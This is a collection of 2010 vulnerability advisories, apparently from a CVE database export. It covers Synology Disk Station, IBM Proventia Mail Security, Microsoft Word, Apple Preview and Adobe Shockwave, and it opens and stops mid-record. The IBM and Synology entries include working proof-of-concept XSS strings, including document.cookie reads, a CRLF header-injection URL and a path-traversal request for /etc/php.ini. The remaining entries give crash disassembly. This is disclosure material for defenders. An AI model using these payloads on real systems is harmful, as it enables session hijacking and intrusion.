9TkAoJHEC0Nm1kt3MDP4MeFf7kjgM/OS
=aEOG
-----END PGP SIGNATURE-----"
14258,Web commands injection through FTP Login in Synology Disk Station - CVE-2010-2453,,CVE-2010-2453,"Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Web commands injection through FTP Login in Synology Disk Station
CVE-2010-2453
INTRODUCTION
Synology Inc develops high-performance, reliable, versatile, and environmentally-friendly Network Attached Storage (NAS) products. Synology's goal
is to deliver user-friendly storage solutions and solid customer service to satisfy the needs of businesses, home offices, individual users and
families.
The disk station product provided by Synology as Network Attached Storage is vulnerable to multiple vulnerabilities including the possibility of
remote command execution via CSRF (Cross Site Request Forging) through FTP login console. The FTP server is provided as a configurable service
through web interface which provides backend access to manage the disks station. The problem occurs in the FTP logging mechanism together with the
admin interface used to view those logs. The FTP console input in the form username and password gets logged in the web application interface.
This problem was confirmed in the following versions of Synology Disk Station, other versions may be also affected.
Synology Disk Station 2.x
Synology issued an update for this vulnerability in the release DSM3.0-1337.
CVSS Scoring System
The CVSS score is: 9.5
Base Score: 10
Temporal Score: 9.5
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:F/RL:U/RC:C
DETAILS
There are four steps for exploitation, specified here together with the identified problem:
1. The attacker can inject malicious input from the FTP login console. As the authentication credentials are inappropriate the FTP authentication
module generates error and the requisite input is logged in to the web interface of the disk station.
2. Secondly the FTP logging module is not designed appropriately and the content comes from the FTP login console is directly placed into the log
window without verification of the Content-Type parameter. The content is allowed to be rendered as HTML, Script etc. An attacker can inject
malicious HTML tags, DOM calls, third part y scripts, CSRF calls that gets executed in the context of logged in account which is administering it.
3. Usually log mechanism is handled by the admin account. The chances of code execution and injection fulfillment are high within full privileges
as of administrator. So any code injected by the attacker becomes persistent in most of the cases and remain there for execution. Moreover CSRF
code with malicious calls can be executed without user interaction.
4. Attacker has to be well versed in directory structure of the disk station manager so that injections can be made according to that and further
operations can be performed. The FTP servers accept username string upto 80-100 characters which is good enough to craft injections to get the
things done The scripts can be inserted from local domain or LAN or third party source to inject arbitrary code.
C:UsersAdministrator>ftp example.com
Connected to example.com.
220 Disk Station FTP server at DiskStation ready.
User (example.com:(none)): ""/><script>alert(""Check Point VDT""</script>
331 Password required for ""/><script>alert(""Check Point VDT""</script>
Password:
530 Login incorrect.
Login failed.
ftp> Invalid command.
ftp> bye
421 Timeout (300 seconds): closing control connection.
In order to determine the size of the allowed input string, we can do:
C:UsersAdministrator>ftp example.com
Connected to example.com.
220 Disk Station FTP server at DiskStation ready.
User (example.com:(none)): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -> Our input
331 Password required for AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. -> The total lenght really used
Password:
530 Login incorrect.
Login failed.
ftp> Invalid command.
ftp> bye
421 Timeout (300 seconds): closing control connection.
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT) and Aditya
K. Sood from Secniche.
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14343,CVE-2010-3200 : Microsoft Word 2003 MSO Null Pointer Dereference Vulnerability,,CVE-2010-3200,"Advisory
Microsoft Word 2003 MSO Null Pointer Dereference Vulnerability
CVE: 2010-3200
Version
Word 2003 (SP3) 11.8326.11.8324 tested on windows XP SP2/SP3
Details :
A null pointer dereference vulnerability has been noticed in MS Word.The
exception results in the MSO.dll library which fails to handle the
special crafted buffer in a file.The issue can be potentially triggered
by openinga malicious word file which resulted in a null pointer
exception due to invalid memory read.
Note: It has intermediate impact because if system is running (n) number
of instance of MS Word , opening of this malicious doc file results in
crash of all the instances thereby completely subverting the
functionality of word.
The following state of registers and frames were noticed
eax=00000000 ebx=00000000 ecx=02711d68 edx=00000000 esi=00000000
edi=008c1b1c
eip=30f91fd7 esp=0013cca0 ebp=0013ccb4 iopl=0 nv up ei ng nz na
po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
efl=00210282
mso!Ordinal1033+0x3f4:
30f91fd7 8b481c mov ecx,dword ptr [eax+1Ch]
ds:0023:0000001c=????????
0:000> k
ChildEBP RetAddr
WARNING: Stack unwind information not available. Following frames may be
wrong.
0013ccb4 30f16d61 mso!Ordinal1033+0x3f4
0013ccdc 30ef266f mso!Ordinal2272+0xad
0013cdc8 30f16951 mso!Ordinal233+0x596
00000000 00000000 mso!Ordinal1307+0xc0e
0:000> u
mso!Ordinal1033+0x3f4:
30f91fd7 8b481c mov ecx,dword ptr [eax+1Ch]
30f91fda f6c101 test cl,1
30f91fdd 0f85f3b20900 jne mso!Ordinal2868+0x2eb87 (3102d2d6)
30f91fe3 8b701c mov esi,dword ptr [eax+1Ch]
30f91fe6 83e601 and esi,1
30f91fe9 753a jne mso!Ordinal1033+0x442 (30f92025)
30f91feb 8b4848 mov ecx,dword ptr [eax+48h]
30f91fee 2bd1 sub edx,ecx
Basic Block:
30f91fd7 mov ecx,dword ptr [eax+1ch]
Tainted Input Operands: eax
30f91fda test cl,1
Tainted Input Operands: cl
30f91fdd jne mso!ordinal2868+0x2eb87 (3102d2d6)
Tainted Input Operands: ZeroFlag
Proof of Concept
The required proof of concept is available on below mentioned link
http://www.secniche.org/word_crash_11.8326.8324_poc.zip
Vendor Response:
The vulnerability was reported to Microsoft. Due to the nature of
inherent crash no separate bulletin will be released. In the next
release of development this issue will be patched or corrected.
Regards
Aditya K Sood"
14358,MVSA-10-009 / CVE-2010-0155 - IBM Proventia Network Mail Security System - CRLF Injection vulnerability,,CVE-2010-0155,"Security Advisory: MVSA-10-009 / CVE-2010-0155
Vendor: IBM
Products: Proventia Network Mail Security System
Vulnerabilities: CRLF Injection
Risk: Medium
Attack Vector: From Remote
Authentication: Required
Reference: http://www.ventuneac.net/security-advisories/MVSA-10-009



Description
Web-based Local Management Interface (LMI) of IBM Proventia Network Mail Security System appliance (firmware 1.6) is vulnerable to a CRLF Injection vulnerability. When exploited by an authenticated attacker, such vulnerability could lead to compromising the security of the appliance, allowing injection of custom HTTP cookies, forcing external redirects, potential HTTP Response Splitting attacks, etc.
The affected resource is not part of the IBM PNMSS firmware 2.5.
By manipulating the javaVersion parameter of load.php resource, an authenticated attacker can perform the attacks above.
The following exploit allows injecting custom cookies used by the client browser during a valid HTTP session:
url_placeholder/load.php?browVerOK=true&browVerPerfect=false&javaVersion=any%0D%0ASet-cookie: %20MyOwnCookie=SOME_DATA_HERE&javaVendor=Sun%20Microsystems %20Inc.&javaEnabled=true&welcome=true&detectionFlag=1&popupBlocked=no
The following exploit allows forcing external browser redirects:
url_placeholder/load.php?browVerOK=true&browVerPerfect=false&javaVersion=any%0D%0ALocation: %20http://www.google.com%0D%0A&javaVendor=Sun%20Microsystems %20Inc.&javaEnabled=true&welcome=true&detectionFlag=1&popupBlocked=no
Affected Versions
IBM Proventia Network Mail Security System - virtual appliance (firmware 1.6)
Mitigation
Vendor recommends upgrading to PNMSS firmware 2.5 or later.
Alternatively, please contact IBM for technical support.
Disclosure Timeline
2009, November 07: Vulnerabilities discovered and documented
2009, November 08: Notification sent to IBM
2009, November 09: IBM acknowledges receiving the report
2010, September 12: MVSA-10-009 advisory published.
Credits
Dr. Marian Ventuneac
http://ventuneac.net"
14359,MVSA-10-008 / CVE-2010-0154 - IBM Proventia Mail Security System - Insecure Direct Object Reference vulnerability,,CVE-2010-0154,"Security Advisory: MVSA-10-008 / CVE-2010-0154
Vendor: IBM
Products: Proventia Network Mail Security System
Vulnerabilities: Insecure Direct Object Reference
Risk: Medium
Attack Vector: From Remote
Authentication: Required
Reference: http://www.ventuneac.net/security-advisories/MVSA-10-008



Description
Web-based Local Management Interface (LMI) of IBM Proventia Network Mail Security System appliance (firmware 1.6) is vulnerable to an Insecure Direct Object Reference vulnerability. When exploited by an authenticated attacker, such vulnerability could lead to compromising the security of the appliance, allowing OS command execution, local file inclusion resulting in exposure of appliance configuration files, source code, etc.
The affected resource is not part of the IBM PNMSS firmware 2.5.
By manipulating the l parameter of /sla/index.php resource, an authenticated attacker can perform any of the above attacks.
The following test case can be used to expose internal system configuration for PHP engine:
url_placeholder/sla/index.php?l=/../../../../../../../../etc/php.ini
Affected Versions
IBM Proventia Network Mail Security System - virtual appliance (firmware 1.6)
Mitigation
Vendor recommends upgrading to PNMSS firmware 2.5 or later.
Alternatively, please contact IBM for technical support.
Disclosure Timeline
2009, November 07: Vulnerabilities discovered and documented
2009, November 08: Notification sent to IBM
2009, November 09: IBM acknowledges receiving the report
2010, September 12: MVSA-10-008 advisory published.
Credits
Dr. Marian Ventuneac
http://ventuneac.net"
14360,MVSA-10-007 / CVE-2010-0152 - IBM Proventia Mail Security System - Multiple persistent and reflected XSS vulnerabilities,,CVE-2010-0152,"Security Advisory: MVSA-10-007 / CVE-2010-0152
Vendor: IBM
Products: Proventia Network Mail Security System
Vulnerabilities: Multiple Cross-Site Scripting (XSS)
Risk: High
Attack Vector: From Remote
Authentication: Not Required/Required
Reference: http://www.ventuneac.net/security-advisories/MVSA-10-007



Description
Web-based Local Management Interface (LMI) of IBM Proventia Network Mail Security System appliance (firmware 1.6 and 2.5) is vulnerable to multiple persistent and reflected XSS attacks. When exploited by an external/internal attacker, such identified vulnerabilities could lead to Session Hijack, Information Disclosure, force installation of malicious file or Trojan on users' PCs, etc.
A persistent XSS vulnerability can be exploited by an external unauthenticated attacker to inject malicious scripting code which is persistently stored. When the system is accessed by authorised users, such malicious code could be used to severely compromise the security of the appliance.
A persistent XSS vulnerability identified in saved search filters (Mail Security->Email Browser) allows an internal authenticated attacker to inject malicious scripting code.
Multiple reflected XSS vulnerabilities can be exploited by manipulating parameters of pvm_messagestore.php resource.
url_placeholder/pvm_messagestore.php?msgid=&sender=&rcpt=&subject=&meta=&mailsize=&folder=allfolders&date1=<script>alert('xss')</script>&date2=&s=mails&favname=
Reflected XSS vulnerabilities can be exploited by manipulating parameters of the following resources:
* userfilter parameter of pvm_user_management.php resource.
url_placeholder/pvm_user_management.php?userfilter=1%22+onblur%3D%22alert%28%27xss%27%29
* ping parameter of sys_tools.php
url_placeholder/sys_tools.php?form=ping&page=sys_ping.php&ping=<script>alert(document.cookie)</script>
* action parameter of pvm_cert_commaction.php resource
url_placeholder/pvm_cert_commaction.php?ajax=1&action=>""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76; %26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>
* action parameter of pvm_cert_serveraction.php resource.
url_placeholder/pvm_cert_serveraction.php ?ajax=1&action=>""'><script>alert(document.cookie)</script>
* action parameter of pvm_smtpstore.php resource.
url_placeholder/pvm_smtpstore.php?id=frozen&action=""><script>alert(""XSS"")</script>
* l parameter of /sla/index.php resource
url_placeholder/sla/index.php?l=""><script>alert(document.cookie)</script>
Affected Versions
IBM Proventia Network Mail Security System - virtual appliance (firmware 1.6)
IBM Proventia Network Mail Security System - virtual appliance (firmware 2.5)
Mitigation
Vendor recommends upgrading to PNMSS firmware 2.5.0.2 or later.
Alternatively, please contact IBM for technical support.
Disclosure Timeline
2009, November 07: Vulnerabilities discovered and documented
2009, November 08: Notification sent to IBM
2009, November 09: IBM acknowledges receiving the report
2010, March: IBM releases PNMSS Firmware 2.5.0.2 correcting the reported issues
2010, September 12: MVSA-10-007 advisory published.
Credits
Dr. Marian Ventuneac
http://ventuneac.net"
14361,MVSA-10-006 / CVE-2010-0153 - IBM Proventia Network Mail Security System - Cross-Site Request Forgery vulnerabilities,,CVE-2010-0153,"Security Advisory: MVSA-10-006 / CVE-2010-0153
Vendor: IBM
Products: Proventia Network Mail Security System
Vulnerabilities: Cross-Site Request Forgery (XSRF)
Risk: High
Attack Vector: From Remote
Authentication: Required
Reference: http://www.ventuneac.net/security-advisories/MVSA-10-006
Description
Web-based Local Management Interface (LMI) of IBM Proventia Network Mail Security System appliance (firmware 1.6 and 2.5) is vulnerable to XSRF attacks. When exploited by an attacker, the identified vulnerabilities could lead to compromising the security of the appliance, including unauthorized alteration of appliance's settings, DoS attacks, etc.
Affected Versions
IBM Proventia Network Mail Security System - virtual appliance (firmware 1.6)
IBM Proventia Network Mail Security System - virtual appliance (firmware 2.5)
Mitigation
Vendor recommends upgrading to PNMSS firmware 2.5.0.2 or later.
Alternatively, please contact IBM for technical support.
Disclosure Timeline
2009, November 07: Vulnerabilities discovered and documented
2009, November 08: Notification sent to IBM
2009, November 09: IBM acknowledges receiving the report
2010, March: IBM releases PNMSS Firmware 2.5.0.2 correcting the reported issues
2010, September 12: MVSA-10-006 advisory published.
Credits
Dr. Marian Ventuneac
http://ventuneac.net"
14478,Apple CoreGraphics (Preview) Memory Corruption Vulnerability - CVE-2010-1801,,CVE-2010-1801,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Apple CoreGraphics (Preview) Memory Corruption when parsing PDF files
CVE-2010-1801
INTRODUCTION
Apple Preview.app is the default application used in Apple MacOS systems in order to visualize PDF files and does not properly parse PDF files, which leads to memory corruption when opening a malformed file with an invalid size on JBIG2 structure at offset 0x2C1 as in PoC Repro1.pdf or offset 0x2C5 as in PoC Repro2.pdf (both values trigger the same vulnerability).
This problem was confirmed in the following versions of Apple Preview and MacOS, other versions may be also affected.
Apple Mac OS X 10.5.8 (Server as well)
Apple Mac OS X 10.6.2 (Server as well)
Apple Mac OS X 10.6.3 (Server as well)
Apple Mac OS X 10.6.4 (Server as well)
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
This vulnerability can be triggered by creating an invalid JBIG2 structure in two different ways.
The problem is triggered by PoCs available to interested parts which causes invalid memory access in all the refered versions.
DETAILS
Changing offset 0x2C1:
0xdee8600 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3764>: xor %esi,%esi
0xdee8602 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3766>: mov -0x7c(%ebp),%edx
0xdee8605 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3769>: mov -0x118(%ebp),%eax
0xdee860b <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3775>: mov -0x7c(%ebp),%ecx
0xdee860e <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3778>: inc %edx
0xdee860f <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3779>: cmp 0x8(%eax),%ecx
0xdee8612 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3782>: jae 0xdee861a <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3790>
0xdee8614 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3784>: mov 0xc(%eax),%eax
0xdee8617 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+3787>: mov %esi,(%eax,%edi,1) <----- Crash
(gdb) i r $esi $eax $edi
esi 0xc79e860 209315936
eax 0x0 0
edi 0x0 0
(gdb) bt
#0 0x0dee8617 in JBIG2Stream::readSymbolDictSeg ()
#1 0x0dee4f0f in JBIG2Stream::readSegments ()
#2 0x0dee4b5e in JBIG2Stream::reset ()
#3 0x0dee499b in read_bytes ()
#4 0x96d33f32 in jbig2_filter_refill ()
#5 0x96a4b56c in CGPDFSourceRefill ()
#6 0x96a4b402 in CGPDFSourceRead ()
Changing offset 0x2C5:
0xdeb52dc <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2960>: inc %esp
0xdeb52dd <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2961>: and $0x4,%al
0xdeb52df <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2963>: add %al,(%eax)
0xdeb52e1 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2965>: add %al,(%eax)
0xdeb52e3 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2967>: mov %edx,(%esp)
0xdeb52e6 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2970>: call 0xdeb2a96 <_ZN11JBIG2Stream17readGenericBitmapEiiiiiiP11JBIG2BitmapPiS2_i>
0xdeb52eb <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2975>: mov -0x94(%ebp),%ecx
0xdeb52f1 <_ZN11JBIG2Stream17readSymbolDictSegEjjPjj+2981>: mov %eax,(%ecx) <----- Crash
(gdb) i r $eax $ecx
eax 0xc79b640 209303104
ecx 0x0 0
(gdb) bt
#0 0x0deb52f1 in JBIG2Stream::readSymbolDictSeg ()
#1 0x0deb1f0f in JBIG2Stream::readSegments ()
#2 0x0deb1b5e in JBIG2Stream::reset ()
#3 0x0deb199b in read_bytes ()
#4 0x96d33f32 in jbig2_filter_refill ()
#5 0x96a4b56c in CGPDFSourceRefill ()
#6 0x96a4b402 in CGPDFSourceRead ()
#7 0x96aa3c8f in CGAccessSessionGetChunks ()
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14494,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-2880,,CVE-2010-2880,"Dear List,
I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2010-2880
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave Player does not properly parse .dir media file, which causes a corruption in module DIRAPI.dll by opening a malformed file with an invalid value located in PoC repro01.dir at offset 0x47.
This problem was confirmed in the following versions of Adobe Shockwave Player, other versions may be also affected.
Shockwave Player version 11.5.7.609 and older for Windows and MacOS
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro01.dir) is available to interested parts.
DETAILS
Disassembly:
68001602 40 INC EAX
68001603 83E0 FE AND EAX,FFFFFFFE
68001606 8945 04 MOV DWORD PTR SS:[EBP+4],EAX
68001609 8D5408 08 LEA EDX,DWORD PTR DS:[EAX+ECX+8]
6800160D 8B47 20 MOV EAX,DWORD PTR DS:[EDI+20]
68001610 8B58 10 MOV EBX,DWORD PTR DS:[EAX+10]
68001613 83FB FF CMP EBX,-1
68001616 895424 14 MOV DWORD PTR SS:[ESP+14],EDX
6800161A 895C24 10 MOV DWORD PTR SS:[ESP+10],EBX
6800161E 0F8E 92010000 JLE DIRAPI.680017B6
68001624 53 PUSH EBX
68001625 57 PUSH EDI
68001626 E8 C5140000 CALL DIRAPI.68002AF0
6800162B 8BD8 MOV EBX,EAX
6800162D 8B43 10 MOV EAX,DWORD PTR DS:[EBX+10] <-- Problem
EBX = 0x46A6FAAC
EAX = 0x46A6FAAC
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14495,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-2881,,CVE-2010-2881,"I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2010-2881
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave player does not properly parse .dir media file, which causes a corruption in module IML32.dll by opening a malformed file with an invalid value located in PoC repro02.dir at offset 0x24C0.
This problem was confirmed in the following versions of Adobe Shockwave Player, other versions may be also affected.
Shockwave Player version 11.5.7.609 and older for Windows and MacOS
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro02.dir) is available to interested parts, together with a deep exploitability analysis.
DETAILS
Disassembly:
6900725F 8B0D 3CEA0B69 MOV ECX,DWORD PTR DS:[690BEA3C]
69007265 8B7D 08 MOV EDI,DWORD PTR SS:[EBP+8]
69007268 8B75 0C MOV ESI,DWORD PTR SS:[EBP+C]
6900726B F7C7 07000000 TEST EDI,7
69007271 74 0F JE SHORT IML32.69007282
69007273 8A06 MOV AL,BYTE PTR DS:[ESI]
69007275 83C6 01 ADD ESI,1
69007278 8807 MOV BYTE PTR DS:[EDI],AL
6900727A 83C7 01 ADD EDI,1
6900727D 49 DEC ECX
6900727E 74 42 JE SHORT IML32.690072C2
69007280 ^EB E9 JMP SHORT IML32.6900726B
69007282 83F9 20 CMP ECX,20
69007285 7C 29 JL SHORT IML32.690072B0
69007287 0F6F5E 18 MOVQ MM3,QWORD PTR DS:[ESI+18] <--- Problem
ESI = 0x06CAFFE8
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14496,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-2864,,CVE-2010-2864,"I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2010-2864
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave player does not properly parse .dir media file, which causes a corruption in module IML32.dll by opening a malformed file with an invalid value located in PoC repro03.dir at offset 0x24C6.
This problem was confirmed in the following versions of Adobe Shockwave Player, other versions may be also affected.
Shockwave Player version 11.5.7.609 and older for Windows and MacOS
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro03.dir) is available to interested parts.
DETAILS
Disassembly:
69009F10 > 56 PUSH ESI
69009F11 8B7424 08 MOV ESI,DWORD PTR SS:[ESP+8]
69009F15 85F6 TEST ESI,ESI
69009F17 74 46 JE SHORT IML32.69009F5F
69009F19 8B06 MOV EAX,DWORD PTR DS:[ESI]
69009F1B 85C0 TEST EAX,EAX
69009F1D 74 3A JE SHORT IML32.69009F59
69009F1F 8B48 04 MOV ECX,DWORD PTR DS:[EAX+4] <--- Problem
EAX = 0xA1A10000
ECX = 0x0013D0C8
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14497,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-2869,,CVE-2010-2869,"I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2010-2869
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave player does not properly parse .dir media file, which causes a corruption in module IML32.dll by opening a malformed file with an invalid value located in PoC repro10.dir at offset 0x3712.
This problem was confirmed in the following versions of Adobe Shockwave Player, other versions may be also affected.
Shockwave Player version 11.5.7.609 and older for Windows and MacOS
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro10.dir) is available to interested parts.
DETAILS
Disassembly:
7C9011DD > 8BFF MOV EDI,EDI
7C9011DF 55 PUSH EBP
7C9011E0 8BEC MOV EBP,ESP
7C9011E2 83EC 54 SUB ESP,54
7C9011E5 56 PUSH ESI
7C9011E6 64:A1 18000000 MOV EAX,DWORD PTR FS:[18]
7C9011EC 803D 94E0977C 00 CMP BYTE PTR DS:[7C97E094],0
7C9011F3 8B75 08 MOV ESI,DWORD PTR SS:[EBP+8]
7C9011F6 8945 FC MOV DWORD PTR SS:[EBP-4],EAX
7C9011F9 0F85 F7EC0000 JNZ ntdll.7C90FEF6
7C9011FF F646 10 10 TEST BYTE PTR DS:[ESI+10],10
7C901203 0F84 EDEC0000 JE ntdll.7C90FEF6
7C901209 5E POP ESI
7C90120A C9 LEAVE
7C90120B C2 0400 RETN 4
7C90120E > CC INT3
7C90120F C3 RETN <--- Stop Here :)
EIP = 0x00000000
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14498,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-2882,,CVE-2010-2882,"I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2010-2882
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave player does not properly parse .dir media file, which causes a corruption in module DIRAPI.dll by opening a malformed file with an invalid value located in PoC repro.dir at offset 0x3812.
This problem was confirmed in the following versions of Adobe Shockwave Player, other versions may be also affected.
Shockwave Player version 11.5.7.609 and older for Windows and MacOS
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem a PoC file (repro11.dir) is available to interested parts.
DETAILS
Disassembly:
68113255 8B4C24 24 MOV ECX,DWORD PTR SS:[ESP+24]
68113259 8B01 MOV EAX,DWORD PTR DS:[ECX]
6811325B FF48 04 DEC DWORD PTR DS:[EAX+4]
6811325E 8B01 MOV EAX,DWORD PTR DS:[ECX]
68113260 8B48 04 MOV ECX,DWORD PTR DS:[EAX+4]
68113263 85C9 TEST ECX,ECX
68113265 ^0F8F 95EEFFFF JG DIRAPI.68112100
6811326B 8B5424 24 MOV EDX,DWORD PTR SS:[ESP+24]
6811326F 8B08 MOV ECX,DWORD PTR DS:[EAX]
68113271 52 PUSH EDX
68113272 56 PUSH ESI
68113273 FF51 0C CALL DWORD PTR DS:[ECX+C] <--- Problem
ECX = 0x00000000
CREDITS
This vulnerability was discovered and researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14499,Adobe Shockwave Player Memory Corruption Vulnerability - CVE-2010-2868,,CVE-2010-2868,"I'm writing on behalf of the Check Point Vulnerability Discovery Team to publish the following vulnerability.
Check Point Software Technologies - Vulnerability Discovery Team (VDT)
http://www.checkpoint.com/defense/
Memory corruption when Adobe Shockwave Player parses .dir media file
CVE-2010-2868
INTRODUCTION
Adobe Shockwave Player is the Adobe plugin to many different browsers to view rich-media content on the web including animations, interactive presentations, and online entertainment.
Adobe Shockwave player does not properly parse .dir media file, which causes a corruption in module IML32.dll by opening a malformed file with an invalid value located in PoC repro04.dir at offset 0x320D.
This problem was confirmed in the following versions of Adobe Shockwave Player, other versions may be also affected.
Shockwave Player version 11.5.7.609 and older for Windows and MacOS
CVSS Scoring System
The CVSS score is: 9
Base Score: 10
Temporal Score: 9
We used the following values to calculate the scores:
Base score is: AV:N/AC:L/Au:N/C:C/I:C/A:C
Temporal score is: E:POC/RL:U/RC:C
TRIGGERING THE PROBLEM
To trigger the problem PoC files (repro04.dir, repro05.dir, repro06.dir, repro07.dir, repro08.dir and repro09.dir) are available to interested parts.
